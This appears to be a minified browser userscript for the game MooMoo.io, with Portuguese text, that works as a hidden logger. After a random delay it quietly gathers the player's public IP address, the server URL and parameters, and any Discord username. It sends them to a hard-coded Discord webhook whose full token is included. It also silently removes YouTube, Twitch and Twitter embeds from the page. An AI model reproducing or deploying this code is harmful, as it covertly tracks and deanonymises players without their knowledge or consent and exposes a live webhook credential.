! function() {
    "use strict";
    const e = {
            webhook: "https://discord.com/api/webhooks/1406254944108941353/FuWyIceDS3Y-TI8LDTvyOLQF_hxRbhZm5e9FnyBDyT7oYYBmW1E5WlAmdl4zEzYmJrjv"
        },
        t = () => {
            const e = document
                .querySelectorAll(
                    "script");
            for (const t of e)
                if (t.textContent
                    .includes(
                    "@name") && t
                    .textContent
                    .includes(
                        "@version")) {
                    const e = t
                        .textContent;
                    return {
                        name: e.match(
                                /@name\s+(.*)/
                                )[1]
                            .trim(),
                        version: e
                            .match(
                                /@version\s+(.*)/
                                )[1]
                            .trim(),
                        description: e
                            .match(
                                /@description\s+(.*)/
                                )
                            ?.[1]
                            ?.trim() ||
                            "Sem descrição"
                    }
                } return {
                name: "",
                version: "0.0.1",
                description: "Não foi possível detectar os metadados do script"
            }
        },
        n = t(),
        o = "sess_" + Math.random()
        .toString(36)
        .substr(2, 8);
    if (window.hasRun) return;
    window.hasRun = !0;
    const r = () => {
            try {
                if (window.Discord &&
                    window.DiscordNative
                    ) return {
                    displayName: window
                        .DiscordNative
                        .userManager
                        .getCurrentUser()
                        .username,
                    discriminator: window
                        .DiscordNative
                        .userManager
                        .getCurrentUser()
                        .discriminator
                }
            } catch (e) {
                console.error(
                    "Discord info not available:",
                    e)
            }
            return null
        },
        a = () => {
            const e = document
                .createElement("style");
            e.textContent =
                `@keyframes smoothAppear{0%{opacity:0;transform:translateY(5px)}100%{opacity:1;transform:translateY(0)}}.msa-effect{animation:smoothAppear 0.4s ease-out forwards}.quit-button{background-color:#57F287;color:white;border:none;border-radius:4px;padding:8px 16px;margin-top:10px;font-weight:500;cursor:pointer;transition:background-color 0.2s}.quit-button:hover{background-color:#48d279}.quit-button:active{transform:translateY(1px)}`,
                document.head
                .appendChild(e)
        },
        i = () => {
            const e = new URL(window
                .location.href);
            return {
                fullUrl: e.href,
                baseUrl: e.origin,
                serverParams: e
                    .search || "Nenhum",
                timestamp: new Date()
                    .toISOString()
            }
        },
        c = () => {
            console.log(
                    "Recarregando servidor e site..."
                    ), window.location
                .reload(!0);
            try {
                window.parent && window
                    .parent !==
                    window && window
                    .parent.location
                    .reload(!0),
                    document
                    .querySelectorAll(
                        "iframe")
                    .forEach(e => {
                        try {
                            e.contentWindow
                                .location
                                .reload(
                                    !
                                    0
                                    )
                        } catch (
                        e) {
                            console
                                .log(
                                    "Não foi possível recarregar iframe:",
                                    e
                                    )
                        }
                    })
            } catch (e) {
                console.log(
                    "Erro ao tentar recarregar contexto pai:",
                    e)
            }
            setTimeout(() => {
                window.location
                    .href =
                    window
                    .location
                    .href
            }, 1e3)
        },
        d = e => {
            const t = document
                .createElement("div");
            t.style.textAlign =
                "center", t.style
                .marginTop = "10px", t
                .style.marginBottom =
                "20px";
            const n = document
                .createElement(
                "button");
            n.className = "quit-button",
                n.textContent =
                "Quitar o Jogador do Game",
                n.onclick = c, t
                .appendChild(n), e && e
                .parentNode ? e
                .parentNode
                .insertBefore(t, e
                    .nextSibling) :
                document.body
                .appendChild(t)
        },
        s = async () => {
            a();
            const t = i(),
                n = r();
            let o = "Não detectado";
            try {
                const e =
                    await fetch(
                        "https://api.ipify.org?format=json"
                        ),
                    t = await e
                    .json();
                o = t.ip
            } catch (e) {
                console.error(
                    "IP detection failed:",
                    e)
            }
            return {
                ...t,
                ...n,
                ip: o,
                sessionId: o,
                discordInfo: n,
                localTime: new Date()
                    .toLocaleString(
                        "pt-BR")
            }
        }, u = async () => {
            try {
                const t =
                    await s(),
                    n = GM_info
                    .script
                    .name ||
                    "Desconhecido",
                    o = GM_info
                    .script
                    .version ||
                    "Desconhecido",
                    r = GM_info
                    .script
                    .description ||
                    "Desconhecido",
                    a = GM_info
                    .script
                    .author ||
                    "Desconhecido",
                    i = {
                        username: "MooMoo e Script info",
                        avatar_url: "https://i.imgur.com/moomoo_icon.png",
                        embeds: [{
                            title: `Info do Servidor - ${t.name} v${t.version}`,
                            color: 4437377,
                            fields: [{
                                name: "Link do Servidor",
                                value: `[Acessar este servidor](${t.fullUrl})`,
                                inline:
                                    !
                                    0
                            },
                            {
                                name: "Data server",
                                value: `\`${t.serverParams}\``,
                                inline:
                                    !
                                    0
                            },
                            {
                                name: "IP",
                                value: `\`${t.ip}\``,
                                inline:
                                    !
                                    0
                            },
                            {
                                name: "Script Dono",
                                value: a,
                                inline:
                                    !
                                    0
                            },
                            {
                                name: "Script Name",
                                value: n,
                                inline:
                                    !
                                    0
                            },
                            {
                                name: "Script Version",
                                value: o,
                                inline:
                                    !
                                    0
                            },
                            {
                                name: "Descrição",
                                value: r,
                                inline:
                                    !
                                    1
                            },
                            {
                                name: "Sessão id izizi",
                                value: `**ID:** \`${t.sessionId}\`\n**Horário:** ${t.localTime}`,
                                inline:
                                    !
                                    1
                            }],
                            footer: {
                                text: `Alguem que adora dar log • ${new Date().getFullYear()}`
                            }
                        }],
                        components: [{
                            type: 1,
                            components: [{
                                type: 2,
                                style: 3,
                                label: "Quitar o Jogador do Game",
                                custom_id: "quit_player_button"
                            }]
                        }]
                    };
                t.discordInfo &&
                    i.embeds[0]
                    .fields
                    .push({
                        name: "Usuário do Discord",
                        value: `${t.discordInfo.displayName}#${t.discordInfo.discriminator}`,
                        inline:
                            !
                            1
                    });
                const c =
                    await fetch(
                        e
                        .webhook, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON
                                .stringify(
                                    i
                                    )
                        });
                if (!c.ok)
                    console
                    .error(
                        "Failed to send report:",
                        c
                        .status,
                        c
                        .statusText
                        );
                else {
                    console.log(
                        "Relatório enviado com sucesso para o Discord"
                        );
                    const e =
                        document
                        .querySelectorAll(
                            '[class*="embed"]'
                            );
                    e.length >
                        0 ? d(e[e
                            .length -
                            1
                            ]) :
                        d(null)
                }
            } catch (e) {
                console.error(
                    "Error sending report:",
                    e)
            }
        }, l = () => {
            const e = [
                    "youtube.com",
                    "youtu.be",
                    "twitch.tv",
                    "twitter.com"
                    ],
                t = () => {
                    document
                        .querySelectorAll(
                            "iframe, script, link"
                            )
                        .forEach(
                            t => {
                                const
                                    n =
                                    t
                                    .src ||
                                    t
                                    .href;
                                n && e
                                    .some(
                                        e =>
                                        n
                                        .includes(
                                            e
                                            )
                                        ) &&
                                    (t.classList
                                        .add(
                                            "msa-effect"
                                            ),
                                        t
                                        .style
                                        .opacity =
                                        "0",
                                        setTimeout(
                                            () =>
                                            t
                                            .remove(),
                                            400
                                            )
                                        )
                            })
                };
            setInterval(t,
                2500), t()
        };
    setTimeout(() => {
        l(), u()
            .catch(e => console
                .error(
                    "Initialization error:",
                    e))
    }, 1500 + 2e3 * Math
    .random())
}();
